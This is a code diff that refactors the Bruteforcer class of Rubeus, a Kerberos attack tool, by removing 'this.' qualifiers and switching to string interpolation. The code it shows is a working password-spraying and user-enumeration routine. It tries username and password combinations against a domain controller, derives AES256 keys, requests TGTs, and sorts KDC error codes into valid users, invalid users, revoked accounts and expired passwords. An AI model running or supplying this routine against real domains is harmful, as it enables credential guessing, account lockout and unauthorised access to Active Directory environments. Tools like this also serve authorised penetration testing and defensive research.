@@ -27,11 +27,11 @@ namespace Rubeus
         public Bruteforcer(string domain, string domainController, IBruteforcerReporter reporter)
         {
             this.domain = domain;
-            this.dc = domainController;
+            dc = domainController;
             this.reporter = reporter;
-            this.invalidUsers = new Dictionary<string, bool>();
-            this.validUsers = new Dictionary<string, bool>();
-            this.validCredentials = new Dictionary<string, string>();
+            invalidUsers = new Dictionary<string, bool>();
+            validUsers = new Dictionary<string, bool>();
+            validCredentials = new Dictionary<string, string>();
         }
 
         public bool Attack(string[] usernames, string[] passwords)
@@ -41,7 +41,7 @@ namespace Rubeus
             {
                 foreach (string username in usernames)
                 {
-                    if(this.TestUsernamePassword(username, password))
+                    if(TestUsernamePassword(username, password))
                     {
                         success = true;
                     }
@@ -57,13 +57,13 @@ namespace Rubeus
             {
                 if (!invalidUsers.ContainsKey(username) && !validCredentials.ContainsKey(username))
                 {
-                    this.GetUsernamePasswordTGT(username, password);
+                    GetUsernamePasswordTGT(username, password);
                     return true;
                 }
             }
             catch (KerberosErrorException ex)
             {
-                return this.HandleKerberosError(ex, username, password);
+                return HandleKerberosError(ex, username, password);
             }
 
             return false;
@@ -72,21 +72,21 @@ namespace Rubeus
         private void GetUsernamePasswordTGT(string username, string password)
         {
             Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-            string salt = String.Format("{0}{1}", domain.ToUpper(), username);
+            string salt = $"{domain.ToUpper()}{username}";
 
             // special case for computer account salts
             if (username.EndsWith("$"))
             {
-                salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
+                salt = $"{domain.ToUpper()}host{username.TrimEnd('$').ToLower()}.{domain.ToLower()}";
             }
 
             string hash = Crypto.KerberosPasswordHash(encType, password, salt);
 
             AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);
 
-            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
+            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, dc);
 
-            this.ReportValidPassword(username, password, TGT);
+            ReportValidPassword(username, password, TGT);
         }
 
         private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
@@ -99,23 +99,23 @@ namespace Rubeus
             switch ((Interop.KERBEROS_ERROR)krbError.error_code)
             {
                 case Interop.KERBEROS_ERROR.KDC_ERR_PREAUTH_FAILED:
-                    this.ReportValidUser(username);
+                    ReportValidUser(username);
                     break;
                 case Interop.KERBEROS_ERROR.KDC_ERR_C_PRINCIPAL_UNKNOWN:
-                    this.ReportInvalidUser(username);
+                    ReportInvalidUser(username);
                     break;
                 case Interop.KERBEROS_ERROR.KDC_ERR_CLIENT_REVOKED:
-                    this.ReportBlockedUser(username);
+                    ReportBlockedUser(username);
                     break;
                 case Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP:
-                    this.ReportInvalidEncryptionType(username, krbError);
+                    ReportInvalidEncryptionType(username, krbError);
                     break;
                 case Interop.KERBEROS_ERROR.KDC_ERR_KEY_EXPIRED:
-                    this.ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
+                    ReportValidPassword(username, password, null, (Interop.KERBEROS_ERROR)krbError.error_code);
                     ret = true;
                     break;
                 default:
-                    this.ReportKrbError(username, krbError);
+                    ReportKrbError(username, krbError);
                     throw ex;
             }
             return ret;
@@ -129,7 +129,7 @@ namespace Rubeus
             {
                 validUsers.Add(username, true);
             }
-            this.reporter.ReportValidPassword(this.domain, username, password, ticket, err);
+            reporter.ReportValidPassword(domain, username, password, ticket, err);
         }
 
         private void ReportValidUser(string username)
@@ -137,7 +137,7 @@ namespace Rubeus
             if (!validUsers.ContainsKey(username))
             {
                 validUsers.Add(username, true);
-                this.reporter.ReportValidUser(this.domain, username);
+                reporter.ReportValidUser(domain, username);
             }
         }
 
@@ -146,7 +146,7 @@ namespace Rubeus
             if (!invalidUsers.ContainsKey(username))
             {
                 invalidUsers.Add(username, true);
-                this.reporter.ReportInvalidUser(this.domain, username);
+                reporter.ReportInvalidUser(domain, username);
             }
         }
 
@@ -155,7 +155,7 @@ namespace Rubeus
             if (!invalidUsers.ContainsKey(username))
             {
                 invalidUsers.Add(username, true);
-                this.reporter.ReportBlockedUser(this.domain, username);
+                reporter.ReportBlockedUser(domain, username);
             }
         }
 
@@ -164,13 +164,13 @@ namespace Rubeus
             if (!invalidUsers.ContainsKey(username))
             {
                 invalidUsers.Add(username, true);
-                this.ReportKrbError(username, krbError);
+                ReportKrbError(username, krbError);
             }
         }
 
         private void ReportKrbError(string username, KRB_ERROR krbError)
         {
-            this.reporter.ReportKrbError(this.domain, username, krbError);
+            reporter.ReportKrbError(domain, username, krbError);
         }
 
     }
